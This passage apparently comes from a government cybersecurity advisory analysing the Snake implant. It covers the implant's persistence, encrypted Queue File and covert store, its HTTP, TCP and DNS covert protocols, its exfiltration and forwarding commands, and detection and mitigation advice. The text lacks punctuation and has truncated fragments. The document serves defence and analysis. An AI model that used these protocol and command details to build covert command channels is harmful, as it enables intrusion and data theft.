difficulties even for tools that are independent of the compromised operating system since simple signatures targeting Snake host components would be ineffectiveThe Snake version primarily discussed in this advisory registers a service to maintain persistence on a system Typically this service is named WerFaultSvc which we assess was used to blend in with the legitimate Windows service WerSvc On boot this service will execute Snakes WerFaultexe which Snake developers chose to hide among the numerous valid Windows WerFaultexe files in the windowsWinSxS directory Executing WerFaultexe will start the process of decrypting Snakes components and loading them into memoryUpon execution Snakes WerFaultexe will attempt to decrypt an encrypted blob within the Windows registry that is typically found at HKLMSOFTWAREClasseswavOpenWithProgIds The encrypted data includes the AES key IV and path that is used to find and decrypt the file containing Snakes kernel driver and kernel driver loader The registry objects structure can be seen on the right side of the following figure Snake uses Microsoft Windows Cryptography API Next Generation CNG key store to store the AES key needed to decrypt the registry objectSnakes installer drops the kernel driver and a custom DLL which is used to load the driver into a single AES encrypted file on disk Typically this file is named comadmindat and is stored in the windowssystem32Com directory The structure of this file can be seen on the left side of the figure above The key IV and path to comadmindat are stored in the encrypted registry blobThe last host-based artifact to discuss is the Queue File Typically this file has been found within the windowsRegistration directory with the format of RANDOMGUIDRANDOMGUIDcrmlog and is decrypted by Snakes kernel driver Due to the complexity and importance of the Queue File its details are discussed at length in the following subsectionThe Queue is a Snake structure that contains various pieces of information including key material communication channels modes of operation the principal user mode component etc that Snake requires for successful operation It should be noted that this is a name used by the developers and is not equivalent to a queue in the normal context of computer science The Queue data is saved on disk in the Queue File which is a flat file with a substructure that includes a 0x2c-byte file header followed by data blocks Each data block corresponds to exactly one Queue Item which could be for example a simple configuration parameter a Snake command or an entire embedded executable Each Queue Item is associated with a specific Queue ContainerEach Container is identified by its Type and Instance values Each Container Type holds the same type of information used by the Snake implant for a specific purpose The following table shows the various Container Types and their functions A Queue can have multiple Containers of the same Type but each of these Containers will have different Instance valuesThe data in each Container in the Queue is separated into Queue Items with the 0x40-byte metadata structure shown in the following table The data content of the Queue Item immediately follows this structure The Queue Items in each Container are distinguished by their corresponding Item Number as well as their Item Type identifier The Item Number is assigned by the Snake implant itself while Snake operators generally refer to the Item Type value when trying to reference a specific itemIn previous versions of Snake the Queue File existed within an encrypted covert store The data belonging to the Queue Items themselves were also CAST-128 encrypted In more recent versions the covert store was removed and the Queue File exists by itself on disk The Queue Items inside the Queue File are still encrypted with CAST-128 and in addition the full Queue File is also CAST-128 encrypted The CAST keys used to encrypt the Queue Items within a Container Instance can be found in that Instance's corresponding 0x2 Container as Item Type 0x229 see below The key and IV used to encrypt the Queue File can be found by decoding strings within Snakes kernel driverThe 0xb Container lists the available modes of operation for a given Snake implant When using a certain mode Snake uses a specific set of Containers and communication channels Each infection can use up to four different modes Each mode in the 0xb Container will have a Container Instance value that all Containers associated with this mode will use except for the 0x3 ContainerThe 0x0 Container handles incoming commandsdata for the host of the Snake infection Commands will be queued in this Container until the implant is ready to execute themThe 0x1 Container handles outbound commandsdata for the host of the Snake infection The data will be queued within the 0x1 Container until the implant is ready to exfiltrate themThe 0x2 Container holds the configuration information for the mode to which it corresponds Various pieces of information vital to Snakes successful operation are stored within these Containers This subsection will discuss a subset of the parameters that can be found within the 0x2 ContainerPivotal key information can be found within the 0x2 Containers This includes the inbound and outbound RSA keys Items 0x228 and 0x227 respectively the CAST key Item 0x229 used to encrypt the individual items within the Queue Container pre-shared keys used for the top layer of encryption in Snakes network communication protocol and a quasi-unique value for the implant called the ustart value needed for Snake network connectivitySnake is constantly passing data between its kernel and user mode components The methodology generally named pipes used to make these communications is listed in Items 0x65-0x6f of the 0x2 Container Items 0x70-0x7a list the parameters necessary to establish these communicationsItems 0xc9-0xd3 contain details of up to ten other Snake infections referred to as communication channels which the implant can communicate with during Passive Operations The parameters needed to establish Snake sessions with the other hosts can be found in Items 0xd4-0xdeMany additional data points such as the process name where Snake injected itself or the modules Snake has loaded from its 0x3 Container can be found within 0x2 ContainersThe 0x3 Container houses embedded files and modules for Snake A single 0x3 Container will be accessible to all Containers in the Queue The 0x3 Container has its own dedicated 0x2 Container that only includes a single Queue Item of Item Type 0x229 a CAST-128 key This key will be used to encrypt and decrypt all of the embedded files and modules within the 0x3 ContainerThe Item Types assigned to the embedded files and modules within the 0x3 Container are consistent across all of the Snake infections within Snakes P2P network For example the 0x01 Item Type is the Zlib library and therefore any time an Item Type of 0x01 is seen within the 0x3 Container of a Snake infection that file is always the Zlib library The implants 0x2 Container will keep track of libraries that it has loaded If the DLL is a file on disk the full path to the DLL is saved in the 0x2 Container If the library was loaded from a 0x3 Container the loaded module will be displayed in the implants 0x2 Container in the format Item Type within 3 container of loaded moduleThe 0x4 Container logs command activity Each Queue Item within the Container is a log of a single executed or attempted command Each mode will have its own corresponding 0x4 ContainerThe 0x5 Container holds Snake network logs noting any IP address that has connected to this implant Some versions of Snake no longer make use of this ContainerThe 0x6 Container saves commands that are set to execute at specific times A Queue Item is created for each scheduled commandThe 0x7 Container logs the IP addresses of any other Snake implants that have connected to this implant during Passive Operations The commands 0x79 Read Agents Track and 0x7a Clear Agents Track are used to interact with this Container Note that the command 0x7a had been deprecated in some versions of Snake and returns the error function unsupported if calledSnakes network communications are encrypted fragmented and sent using custom methodologies that ride over common network protocols including both raw TCP and UDP sockets and higher-level protocols like HTTP SMTP and DNS Snakes protocols for HTTP and TCP are the most commonly seen but functionality exists for UDP ICMP and raw IP traffic Snakes network communications are comprised of sessions which are distinct from the sessions associated with the legitimate protocol it is riding on top of eg TCP sessions The Snake session is then comprised of distinct commands Both Snakes custom transport encryption layer enc and Snakes Application Layer have their own encryption mechanisms where the enc layer operates on an individual P2P session and the Snake Application Layer provides end-to-end encryption between the controller ie point of origin and the commands ultimate destination The following figure details Snakes communication protocol stackSnakes use of its kernel module also facilitates stealthy network communications To participate fully in Snakes P2P network implanted machines which are not the ultimate target must act as servers for other Snake nodes Snakes kernel module along with a thoughtfully designed mechanism for distinguishing Snake traffic from legitimate client traffic allows the implant to function as a server in the Snake P2P network without opening any new ports greatly complicating detection efforts Additionally Snakes custom network communication protocols are designed to blend with traffic that the compromised server normally would receive This allows Snake operators to use legitimate servers as infrastructure which reduces the effectiveness of simple IP address or domain blocking without needing to open new ports or send unusual looking traffic to this infrastructureSnake uses its custom HTTP and raw socket TCP based protocols for large data communications With these protocols and others Snake employs a specific authentication mechanism to distinguish Snake traffic from legitimate traffic destined for application software on the compromised server This technique enables one of the uniquely sophisticated aspects of Snake which is its ability to function effectively as server software without opening any further ports on the compromised system The relevant per-implant authentication value is referred to as the ustart and is stored in the implants Queue File There are multiple forms of the ustart value including ustart ustart2 and ustartlRather than open a listening socket on a specified TCP port the Snake kernel module intercepts the first client-to-server packet following the 3-way handshake in every TCP session The kernel module then determines whether or not the contents of that packet are in fact valid for the ustart value of that target Snake implant If so the Snake kernel module forwards that packet and any future packets in the same TCP session to Snakes own processing functionality and the presumably legitimate application listening on that port remains unaware of this TCP session If not the Snake kernel module allows the packetand the rest of the TCP session as it occursto reach the legitimate listening application for example web server software See the following for an illustrationAll of the ustart versions perform authentication by sending a random nonce along with data that comprises a mathematical operation on the combination of the nonce and the ustart value itself The receiving machine then extracts the nonce and performs the same computations to authenticate the sending machine The ustart2 and ustartl versions use the Fowler-Noll-Vo FNV hash algorithm to generate the overall authentication value from the nonce and the ustart This mechanism is slightly different in the custom Snake HTTP protocol versus the custom Snake TCP protocolUsing the ustart methodology a node in the Snake P2P network can function as a server without opening any otherwise closed ports and without interfering in the compromised servers legitimate functionality Snake will only communicate over TCP ports on which another application is actively listening This technique makes detecting Snake compromises through network traffic monitoring far more difficult Inbound traffic to an unexpected TCP port can be detected or blocked using standard firewall or network intrusion detection functionality Replacing a legitimate service application with a modified executable can lead to detection at either the host or network level Snakes technique bypasses both of these mitigations When combined with the fact that Snake traffic looks similar to expected traffic especially in the case of Snakes HTTP based protocols this renders detecting Snake communications difficult absent detailed knowledge of Snakes custom protocolsSnake uses a specialized communications protocol to encode information in seemingly standard DNS queries run via the Windows or POSIX API function gethostbyname depending on the versionSnake outbound DNS requests consist of character strings that are constructed to resemble standard domain names The actual information being transmitted from the implant is contained in the part of the character string prior to the first character For illustration purposes this subsection will outline how an arbitrary string of bytes is manipulated and then encoded to form an outbound Snake DNS request carrying data provided by the implantSnake outbound DNS requests originally take the form of byte arrays stored on the stack as the implant progresses through the communications function The byte array has the following structureOnly the low-order seven bits of the flags byte are used and they have the following significanceAfter calculating and obfuscating the byte array values shown above Snake encodes these byte values as de-facto base32 text using the ten digits 0-9 and the 26 lowercase ASCII letters a-z with v w x y and z all corresponding to the same value as only 32 distinct characters are needed Snake then inserts - characters at specified locations and sends the DNS request using the gethostbyname function The resulting encoded string mimics a legitimate DNS request because characters after the first are not part of the implants communications any arbitrary suffix eg com can be usedAfter sending the encoded DNS request Snake parses the returned information In a normal DNS request the returned hostent structure contains a list of IPv4 addresses as 32-bit unsigned integers if the domain resolves to one or more IPv4 addresses In the Snake DNS protocol these 32-bit integers represent the covert channel data The Snake implant sorts the 32-bit integers by the highest order nibble and then interprets the remaining 28 bits of each integer as the actual encoded data The Snake DNS protocol thus provides a well-concealed low-bandwidth communications channel For larger bandwidth communications Snake uses its custom HTTP and TCP protocolsThe most common custom protocol that Snake uses is its http protocol which rides on top of standard HTTP It generally looks like normal HTTP communications including a lot of base64-looking strings thus blending well with normal network traffic There have been multiple iterations of Snakes http protocol though the differences are only in the encoding once that is peeled away the underlying Snake http protocol is the same For the purposes of this document Snakes former version of HTTP will be referred to as http and its more recent version as http2Snake communications using http2 are contained within seemingly legitimate Application Layer HTTP communications In the client-to-server direction the implant data is contained within an HTTP header field of a GET request unless the data is over a certain size usually 256 bytes but configurable Observed field keys have included Auth-Data Cache-Auth Cookie and Cockie note misspelling This list is not exhaustive any standard HTTP header field can be used The communication itself is contained in the legitimate HTTP header fields value meaning the content following the character and any whitespace immediately thereafter In HTTP GET requests the implant generally uses the default path but this is not required and is configurableLarger client-to-server Snake http2 requests are contained in the body of an HTTP POST request and server-to-client communications are contained in the body of the HTTP responseAll client-to-server Snake http and http2 requests begin with the ustart authentication The specifics vary with each ustart version but in each case the random nonce and the computed function of the nonce and ustart value are encoded in a manner which closely resembles the rest of the Snake communication Since Snake http and http2 implant sessions can span multiple TCP sessions the ustart authentication mechanism is included in every client-to-server communicationSnakes http2 protocol uses a custom base62 encoding scheme that has the following differences from base64 Base62 uses 62 semantically significant characters instead of 64 The ratio of encoded-to-decoded characters in base62 is less dense 118 than the ratio base64 can achieve 129 Also base62 uses extraneous characters in certain instances that have no semantic significanceThe base62 characters of semantic significance are the 62 strict alphanumeric characters 0-9A-Za-z The extraneous characters that can be present in a base62 stringbut which have no semantic significanceare and underscore When present these characters are removed prior to performing the decoding process A valid base62 string can have up to 11 of these extraneous characters A regular expression for base62 is included in the Mitigations section of this CSAAfter the base62 decoding is completed if necessary the remaining data begins with an 8-byte metadata structure that provides rudimentary sessionization on top of the stateless HTTP Snakes http and http2 client-to-server communications have three de-facto parts which are concatenated into a single HTTP header value These parts are 1 an announce or authentication string 2 a custom metadata structure and 3 payload data The metadata structure consists of the followingSnake uses the sessionnumber and communicationnumber fields to provide its own custom sessionization on top of the stateless Application Layer HTTP protocol The checksum byte serves to validate the integrity of the structure and must equal the sum of the first seven bytes modulo 256Snake has the ability to communicate through POSIX-style TCP sockets The implants custom TCP protocol which herein will be called tcp uses the reliability features of the underlying TCP protocol Thus in the implants custom tcp protocol the concept of a TCP session and an implant session are the same whereas in the implants custom http protocols one implant session could span multiple Transport Layer TCP sessions Since the implants overall communications protocol is based on the idea of commands and responses Snake depends on being able to specify the length of any given command and response so the recipient Snake node knows when a particular communication ends Snake achieves this in the custom tcp protocol by prefacing each communication with its length encoded as a 32-bit big-endian unsigned integerImmediately following the TCP 3-way handshake the implant completes the ustart authentication for this session Since Snake tcp sessions are mapped one-to-one with an underlying protocol TCP session the ustart authentication only occurs once per session rather than with each client-to-server communication as in Snake http and http2 The Snake tcp ustart mechanism is similar to the Snake http and http2 mechanisms except that for certain ustart versions Snake tcp uses a raw binary ustart which is not encoded in printable charactersAfter the ustart authentication the implant will begin sending length-data pairs These pairs can be sent in the same packet or in two or theoretically more separate packets but the pattern of length-data pairs will be present in each half of the stream ie each direction for the entirety of the implant communications for the remainder of the TCP session Specifically a length-data pair will consist of the length encoded as a big-endian 32-bit unsigned integer followed by data of exactly that length For example consider the instance where the implant is sending the following 4 arbitrary bytesThe on-wire communication from the implant would send the integer value 4 encoded as a big-endian 32-bit integer followed by the actual 4 bytes themselves as shown below This could be split across two or theoretically more packetsThe custom tcp protocol as well as all custom http protocols have been used in conjunction with the Snake enc protocol Details of the Snake enc protocol are provided in the following subsection Due to the manner in which the Snake enc and Snake tcp protocols interact the first six length-data pairs of each TCP half-stream following the single client-to-server announce or authentication packet described above will have known lengths Specifically each half-stream will begin with length-data pairs of the following lengths 0x8 0x4 0x10 0x1 0x10 0x10 Note that these are the lengths of the raw data so each communication will be preceded by a 4-byte big-endian integer specifying the corresponding length Thus one of the half-streams could have the following TCP contentAs described above Snake communications are all comprised of Snake sessions irrespective of whichever legitimate protocol Snake is operating on top of Snakes top layer of encryption called the enc layer utilizes a multi-step process to establish a unique session key The session key is formed through the combination of a Diffie-Hellman key exchange mixed with a pre-shared key PSK known to both parties This PSK is stored in one of the communication channels stored within the QueueThe overall establishment of the session key requires 12 communication steps six in each direction which involve sharing the pseudo-random values used in the Diffie-Hellman exchange process as well as custom aspects of the Snake session key derivation method The session key is used to encrypt the command headers and inner encrypted payloadsThis is the layer in which the critical error of providing a value of 128 bits instead of 128 bytes for the call to DHgenerateparameters within the OpenSSL library occurred Due to this insufficient key length breaking the Diffie-Hellman portion of the exchange is possible Note that in the following figure the variables p g a and b are used in standard descriptions of Diffie-HellmanSnakes Application Layer is used to process Snake commands The payload data for a Snake session can contain one or more command exchanges which include both the incoming data sent to the implant as well as the response returned to the server Each command is associated with a specific ordinal and due to Snakes modular design operators are able to add new commands to extend Snakes capabilities by remotely loading a new moduleThe Snake implant differentiates between High and Low commands and handles them differently based on the ordinal number range The majority of Snake commands are High commands that have an ordinal of 0x64 100 decimal or higher There are far fewer Low commands and these include the Forwarding command with ordinal 0x1 and the four Queue commands with ordinals 0xa 0xb 0xc and 0xd While Low commands are mostly used for moving data across the network the High commands give the operator many options for interacting with an infected systemAll commands begin with a 0x15-byte header followed by optional command parameter data only some commands require parameters for successful execution For example the command Get which exfiltrates a file requires the name of the file to exfiltrate whereas the command Process List which returns a process listing does not require any parametersThe most important Command Header field contains the integer ordinal of the command being sent The Item UID field represents a unique identifier for each individual command instance and these values increase sequentially The header has two fields used when a command is set to run at a specified date and time these commands will be written to the 0x6 ContainerSome Low commands have another header before the payload data which will be detailed below All other commands have only the Command Header followed by the encrypted parameter dataUnderneath Snake http2 or tcp encryption at the session layer each command exchange is further encrypted In older versions of Snake the exchanges were CAST-128 encrypted using a different key for incoming and outgoing data These keys were saved in the 0x2 Container in the 0x227 and 0x228 Items The incoming payload data if parameter data was present could be decrypted with the 0x227 CAST key Any response data was encrypted with the 0x228 CAST keyIn recent versions the 0x227 and 0x228 Items hold two RSA-4096 public keys For each side of an exchange a new 16-byte CAST key is created with Microsofts CryptoAPI CryptGenRandom function to obtain 16 random bytes This key is used to CAST-128 encrypt the parameter or response dataFor an incoming command the CAST key is signed not encrypted by the private key corresponding to the public key on the node to create a 512-byte RSA data blob The incoming payload has the RSA blob followed by the optional parameter data which is CAST-128 encrypted Snake uses the 0x227 RSA public key to decrypt the RSA blob recover the CAST key then decrypt the parameter dataFor an outgoing command a new CAST key is obtained from CryptGenRandom and any response data is CAST-128 encrypted The key is then encrypted using the 0x228 public key to create a 512-byte data blob The response payload data contains the 512-byte RSA blob followed by the encrypted response data when presentThe implant will expect data in a specific format for each command ordinal Parameter and response data contain several possible underlying data types including wide-character plaintext strings numeric values data tables files or a combination of multiple typesThe parameter data buffer itself will be formatted in a specific way depending on the command ordinal Some commands have required parameters as well as optional parameters Commands with optional parameters will include a metadata header with the data length and data type eg bool integer text or data buffer before the optional parameters data Other commands will expect the parameters to be formatted with length-data pairs consisting of the parameter data length encoded as a four-byte big-endian integer followed by data of exactly that length Still other commands have a custom header or will expect no length or metadata and will simply send the parameter data aloneThe response data will similarly be formatted by the implant in a specific way according to the command ordinal The response data typically does not have a length or metadata preceding it with the exception of the data tables Examples of commands that return a table are the Process List command and the List Dir commandResponse data that includes a table will start with a table description header that indicates the number of columns and rows in the table In addition the header will include a Column Descriptor structure to indicate the type of data that column will contain for example a string uint32 or uint64 timestamp in epoch format or the contents of a whole file included as a table entryAfter the table description header each field is added to the data payload buffer one at a time in a length-data pair The fields across the first row are added in order then the fields across the second row are added immediately after the first row with no metadata or separation and so on To parse this table the server will account for the number of columns to determine where the next row startsHigh commands are those with an ordinal of 0x64 decimal 100 or higher High commands give the operator many options for interacting with an infected system as well as implant components This subsection will describe some examples of the many High commands that can exist in the implantSome of the most basic High commands will gather information about the machine and return the results For example the FSB operators can use the PS command 0x65 to return a list of running processes the List Dir command 0x840 to list the contents of a directory or the Syst command 0x6b to gather basic system informationThere are several commands that interact with the infected machine using standard built-in OS tools The operator can use the Kill command 0x67 to kill a process the Get command 0x68 to exfiltrate a file the Put command 0x69 to write a file the Del command 0x6a to delete a file or the Run command 0x66 to execute a command in a terminal shell and receive the results For example operators have used the Run command to run PowerShell commands ping other hosts use the Windows net use command to map network drives and to run executable files that had been previously written to the node using the Put commandIn addition to commands that use the built-in OS functionality there are several High commands that interact with Snake components An operator can use the Read Config command 0x70 to read the 0x2 Container which contains configuration data or the Set Config Item command 0x71 to set a specific Queue Item within the 0x2 Container For example operators have used the Set Config Item command to add or update the IP addresses or domains and option parameters used to communicate with other Snake nodes The Read Agents Track and Clear Agents Track commands 0x79 and 0x7a interact with the 0x7 Container to read or delete logs which track which other Snake nodes have connected to this node Note that the 0x7a command has been deprecated in some versions of Snake and returns the error function unsupported if calledSnake has the ability to add additional commands by loading new modules New modules can be loaded using the Load Modules command 0x72 or directly into memory using the Load Modules Mem command 0x7f When compiling a module the developer will assign an ordinal to each constituent command which will then be used by the operator to call the newly added commands These loaded modules can be removed using the Module Unload command 0x73The four Queue commands contain a 0x3d-byte Queue Header following the Command Header In more recent versions of Snake this header is encrypted using the same CAST key used to encrypt the payload data In this case the Command Header is followed by the 512-byte RSA encrypted CAST key blob the encrypted Queue Header and finally the encrypted payload dataEven though each of the four Queue commands only use a subset of the fields of the Queue Header in different ways the full header must be present for the command to be considered valid by the implant Two fields in the header that all four Queue commands use are the Container Instance and Container Type fields which indicate the specific Container on a node the Queue command intends to interact with In the Queue Read and Write commands the Item Type field is used to track the specific commands and their responses in the ContainersThe Queue Enumerate command with ordinal 0xa is used to enumerate the contents of the 0x0 or 0x1 Containers to list all incoming or outgoing commands respectively The enumeration returns the 0x40-byte structure described above for each Queue Item concatenated into a single return bufferThe Queue Read command with ordinal 0xb is used to read an Item from the specified 0x0 or 0x1 Container Several relevant fields in the Queue Header determine how the data is sent and stored For example the header determines whether the data should be sent immediately back to the server or stored for later transport The header indicates if the implant should send the Queue Items header ie the same 0x40-byte metadata structure returned by the 0xa command the Items data or both The header also indicates whether the Queue Item should be deleted after being read and can also indicate that Queue Items with a lower Item Type should be deleted This allows FSB operators to clear out all command Items previous to the one being readThe Queue Write command with ordinal 0xc is used to write a Queue Item to the specified 0x0 or 0x1 Container The Queue Header will indicate if a new Queue Item will be created or an existing Queue Item will be modifiedIf a Queue Item is set to be modified an Item with the specified Item Type must exist in the specified Container Several fields in the header must match specific attributes of the existing Queue Item If these checks are met the parameter data is written to the Queue Item Fields in the Queue Header will indicate the length of data to be written and the offset into the existing Queue Item where the write should beginIf a Queue Item is set to be created Snake will delete existing Queue Items of the specified Item Type in the Container of interest then create a new Item of the specified Item Type and write the parameter data to the Queue Item A field in the Queue Header will indicate the length of data to be writtenThe Queue Delete command with ordinal 0xd is used to delete a Queue Item from the specified 0x0 or 0x1 Container The Flags field will determine if the single Queue Item should be deleted or if all Queue Items with a lower Item Type should be deleted as wellForward commands with command ordinal 0x1 are used to tell an implant to forward a Snake command to a second target node where the command will be executed The target node sends the response data back to the first implant which will then package that response data as its own response back to the callerThe command is designed to tell an implant to forward one command to another implant but in practice Forward commands are often built on top of each other to create a chain of hop points that will continue to forward a command to an end point where it will be executed The response data is then sent back through the same chain of hop points until it reaches the operatorThe Forward command has a 0x199-byte Forward Header followed by the encrypted command parameter data that will be sent to the target node of the Forward command The Forward Header contains the information the implant will need to connect to the target node including the ordinal of the Snake command that is being forwarded to the target node for executionThe implant that receives the Forward command will construct a new Snake command of the ordinal indicated in the Forward Header It will connect to the target node in a new session construct the Command Header and send the encrypted command parameter data on to the target node The parameter data already will have been encrypted using the key associated with the target node so that the target implant will be able to decrypt the parameter data and execute the commandWhen the Forward command is constructed the CAST key used to CAST-128 encrypt the payload datato include the 0x199-byte header and the parameter data to be forwardedis encrypted with the RSA key pair used by the first implant The parameter data that contains the parameters for the command to be forwarded is also CAST-128 encrypted but the key used to encrypt the parameter data is encrypted with the RSA key pair used by the target node The first implant knows through the header what command ordinal it is forwarding but it is unable to decrypt the parameter dataIf the Forward Header sent to the first implant indicates that the command to be forwarded was another Forward command the first target node will decrypt the parameter data and find another Forward Header This first target node implant will then go through the same process to connect to the next target node constructing the new command with the ordinal indicated in the second Forward Header to send the remaining encrypted parameter data to the next target node This will repeat until the command to be forwarded is something other than another Forward commandThe Command Header and pertinent parameters for each target node are encrypted specifically for that node by the operator before the Forward command is sent into the Snake P2P network To illustrate the diagram below shows how the buffer might look when several Forward commands are chained together to include two hop points and an end point The first hop point HP1 will recover the first CAST key and CAST-128 decrypt the rest of the buffer which will uncover the first Forward Header HP1 will then forward the remainder of the decrypted buffer to the next hop point HP2 starting with the second CAST key blob HP2 will recover the second CAST key and CAST-128 decrypt the rest of the buffer which will uncover the second Forward Header HP2 will then forward the remainder of the decrypted buffer to the end point starting with the third CAST key blob The end point will recover the CAST key decrypt the command parameter data and execute the commandWhen a target machine has executed a forwarded command the return data is encrypted with that implants RSA keys and returned directly to the previous hop point As the data is returned up the chain in the Snake P2P network the intermediate hop points do not manipulate the encrypted data as they do not have the RSA private key necessary to do so In this manner the return data is de-facto end-to-end encrypted throughout the P2P network until it arrives back at the FSB operatorSnake uses two main methods for communication and command execution namely Passive and Active In general Snake operators will employ Active operations to communicate with hop points within Snakes infrastructure however hop points can and do sometimes operate using Snakes Passive method Snakes end points tend to solely operate using the Passive methodDuring Active operations Snake commands are issued by an FSB operator or a script to a target machine generally through Forward commands described in the previous section The response to the command is immediately returned to the point of origin following the same path that the command took to reach its end target as shown in the previous figure on Forward command structureDuring Passive operations Snake implants operate on their own without the synchronous interaction of FSB operators The nodes with which an implant communicates during Passive operations are stored within its 0x2 Containers as communication channels Up to ten communication channels can be present at any time an operator can change these channels via the Set Config Item commandDuring Passive operations the implant will beacon by sending a Queue Read 0xb command to one of its stored communication channels that it has chosen at random These Queue Read commands look for a Queue Item within a Container with an Instance Number equal to the implants UID The matching UID indicates the Queue Items in this Container are intended for the beaconing implantIf such a Queue Item is found the beaconing implant will read in the Queue Item and delete it off of the host from which it was read There can be multiple Queue Items found within the specified Queue Container that was beaconed to each Queue Read command will read one of these items This process is repeated until all items within the Container are read which the infrastructure node will indicate by sending a specific error in response to the Queue Read This beaconing will continue to randomly select hosts at nondeterministic time intervals for as long as the implant is set to perform Passive operationsSimilar to how Snake intakes commands passively it can also exfiltrate the resulting data passively This is done using Queue Write 0xc commands to write to one of the stored communication channels chosen at random Once the data is off the end point node operators generally retrieve it manually or using a script The Item Type field which is unique per executed Snake command is needed to associate the exfiltrated data with the target node on which the command was runIn the context of Passive Snake communications the term Item Type is defined as a UID for a given Snake command and its resulting data The Item Type serves as a unique identifier to associate the results of command execution with the original command written by the operator When the FSB collects the data Snake knows exactly what infection the data came from and therefore it can determine what key to use to successfully decrypt the dataTo illustrate how Passive operations are conducted between the end points the operator and the hop points in between see the diagram above which is explained further by the following stepsA number of complementary detection techniques effectively identify some of the more recent variants of Snake However as described above Snake is purpose-built to avoid large-scale detection Below is a discussion of the advantages and disadvantages of various detection methodologies available for SnakeNote that some of the techniques identified in this section can affect the availability or stability of a system Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while hunting for SnakeNetwork Intrusion Detection Systems NIDS can feasibly identify some of the more recent variants of Snake and its custom network protocols as detailed aboveAdvantages High-confidence large-scale network-wide detection of custom Snake communication protocolsDisadvantages Low visibility of Snake implant operations and encrypted data in transit There is some potential for false positives in the Snake http http2 and tcp signatures Snake operators can easily change network-based signaturesSnake client-to-server http and http2 traffic is contained within an arbitrary HTTP header field The header field value for http begins with 10 pure alphanumeric characters followed by base64 encoding of 8 bytes which yields exactly 11 valid base64 characters plus one base64 padding characterThe following two Suricata rules will detect the traffic describedThe header field value for http2 begins with 22 pure alphanumeric characters base62 with non-extraneous characters followed by the base62 encoding of at least 8 bytes which must comprise at least 11 base62 characters with the four extraneous characters allowed The actual requirement is stricter than this expression since the total number of non-extraneous characters alone must equal or exceed 11 however it is not possible to encode that aspect into a regular languageThe following two Suricata rules will detect the traffic describedThe client-to-server communication for tcp must begin with the ustart which is not captured in this signature set Immediately following the ustart the next client-to-server communication must be the big-endian 32-bit unsigned integer 8 followed by any 8 bytes of data The next communication must also be client-to-server and it must comprise the big-endian 32-bit unsigned integer 4 followed by any 4 bytes of data The next two communications must be server-to-client comprising the integer 8 followed by 8 bytes of data and the integer 4 followed by 4 bytes of dataThe following six Suricata rules will in conjunction detect traffic of the form describedAdvantages High confidence based on totality of positive hits for host-based artifactsDisadvantages Many of the artifacts on the host are easily shifted to exist in a different location or with a different name As the files are fully encrypted accurately identifying these files is difficultThe Snake covert store comprises a file-backed NTFS usually or FAT-16 rarely filesystem The filesystem is encrypted with CAST-128 in CBC mode The encryption key can be either statically hardcoded or dynamically stored in a specified Windows registry location The IV is 8 bytes since CAST-128 has an 8-byte block length The first byte of the IV for any 512-byte block of the covert store is the 0-indexed block number The remaining bytes of the IV are the corresponding bytes of the key meaning that bytes at 0-indexed indices 1 through 7 of the IV are the bytes at 0-indexed indices 1 through 7 of the keyWhen stored in the Windows registry the encryption key is the classname associated with the following keyThe following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observedFor tool development the following test vector illustrates the encryption of the first given header above EB 52 90 using CAST-128 with the default key shown above and the IV constructed as described given this header occurs at the beginning of the first 512-byte block of the covert storePlaintext EB 52 90 4E 54 46 53 20KeyA1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79

encryption key if the registry entry does not existand searching for any file with a size that is an even multiple of 220 it is possible to efficiently detect Snake covert stores Validation can be performed by decrypting the entire file using the outlined methodology and then verifying that it comprises an NTFS or FAT-16 filesystemRegistry BlobThe registry blob is generally found at the location listed below In case it is not present at its typical location the registry blob can be found by searching the full registry for a value of at least 0x1000 bytes in size and entropy of at

in addition to being high entropy The Snake Queue File can be located by scanning all files in the typical queue path with filenames matching a regular expression that captures the typical naming convention Files meeting these criteria should be scanned for high entropy which is performed by the Yara rule belowThe following UNIX find command will scan files with names matching the GUID-based

WindowsWinSxS directoryAdvantages High confidence as memory provides the greatest level of visibility into Snakes behaviors and artifactsDisadvantages Potential impact on system stability difficult scalabilityCapturing and analyzing the memory of a system will be the most effective approach in detecting Snake because it bypasses many of the behaviors that Snake employs to hide itself With a memory analysis tool such as Volatility detection of a Snake compromise may be possibleSnakes principal user mode component is injected into a chosen process via a single allocation of PAGEEXECUTEREADWRITE memory The starting offset is generally 0x20000000 however the module does allow for relocation if needed Additionally since the user mode component is not obfuscated in any way a valid PE header can be located at the beginning of the allocated memory region Further validation can be performed by confirming the presence of strings known to exist in the user mode component also within the memory region A plugin compatible with Volatility3 which can scan all processes on a system using this method is provided in the Appendix A screenshot showing the results of the plugin successfully detecting Snake is displayed belowNote that the mitigations that follow are not meant to protect against the initial access vector and are only designed to prevent Snakes persistence and hiding techniquesSystem owners who are believed to be compromised by Snake are advised to change their credentials immediately from a non-compromised system and to not use any type of passwords similar to those used before Snake employs a keylogger functionality that routinely returns logs back to FSB operators Changing passwords and usernames to values which cannot be brute forced or guessed based on old passwords is recommendedSystem owners are advised to apply updates to their Operating Systems Modern versions of Windows Linux and MacOS make it much harder for adversaries to operate in the kernel space This will make it much harder for FSB actors to load Snakes kernel driver on the target systemIf system owners receive detection signatures of Snake implant activity or have other indicators of compromise that are associated with FSB actors using Snake the impacted organization should immediately initiate their documented incident response planWe recommend implementing the following Cross-Sector Cybersecurity Performance Goals CPGs to help defend against FSB actors using Snake or mitigate negative impacts post-compromiseCPG 2A Changing Default Passwords will prevent FSB actors from compromising default credentials to gain initial access or move laterally within a networkCPG 2B Requiring Minimum Password Strength across an organization will prevent FSB actors from being able to successfully conduct password spraying or cracking operationsCPG 2C Requiring Unique Credentials will prevent FSB actors from compromising valid accounts through password spraying or brute forceCPG 2E Separating User and Privileged Accounts will make it harder for FSB actors to gain access to administrator credentialsCPG 2F Network Segmentation to deny all connections by default unless explicitly required for specific system functionality and ensure all incoming communication is going through a properly configured firewallCPG 2H Implementing Phishing Resistant MFA adds an additional layer of security even when account credentials are compromised and can mitigate a variety of attacks towards valid accounts to include brute forcing passwords and exploiting external remote services softwareCPG 4C Deploy Securitytxt Files to ensure all public facing web domains have a securitytxt file that conforms to the recommendations in RFC 9118This advisory was

